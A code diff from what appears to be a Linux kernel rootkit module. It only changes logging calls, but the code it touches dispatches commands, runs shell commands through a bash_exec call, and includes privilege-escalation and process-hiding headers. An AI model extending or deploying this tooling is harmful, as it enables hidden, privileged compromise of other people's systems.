@@ -1,7 +1,6 @@
-#include <linux/kernel.h>
-#include <linux/module.h>
 #include <linux/slab.h>
 
+#include "log.h"
 #include "commands.h"
 #include "privilege_escalation.h"
 #include "hide_proc.h"
@@ -24,7 +23,7 @@ int commands_dispatch(int argc, char **argv)
 	}
 
 	if (o.ind == argc) {
-		printk(KERN_WARNING "%s: Missing command\n", THIS_MODULE->name);
+		IMLOG_WARNING("Missing command\n");
 		return -EINVAL;
 	}
 
@@ -37,8 +36,7 @@ int commands_dispatch(int argc, char **argv)
 	} else if (strncmp("file", cmd, 4) == 0) {
 		commands_file_handler(argc, argv);
 	} else {
-		printk(KERN_WARNING "%s: Unknown command: %s\n",
-		       THIS_MODULE->name, cmd);
+		IMLOG_WARNING("Unknown command: %s\n", cmd);
 		return -EINVAL;
 	}
 
@@ -149,18 +147,17 @@ int commands_proc_handler(int argc, char **argv)
 					break;
 				}
 
-				printk(KERN_INFO
-				       "[API] Calling bash_exec with |%s|",
-				       exec_arg);
+				IMLOG_INFO("Calling bash_exec with |%s|\n",
+					   exec_arg);
 
 				pid_return = bash_exec(exec_arg);
 
 				if (pid_return < 0) {
 					err++;
 				} else {
-					printk(KERN_INFO
-					       "[API] Process successfully executed, pid %d\n",
-					       pid_return);
+					IMLOG_INFO(
+						"Process successfully executed, pid %d\n",
+						pid_return);
 				}
 				break;
 			}
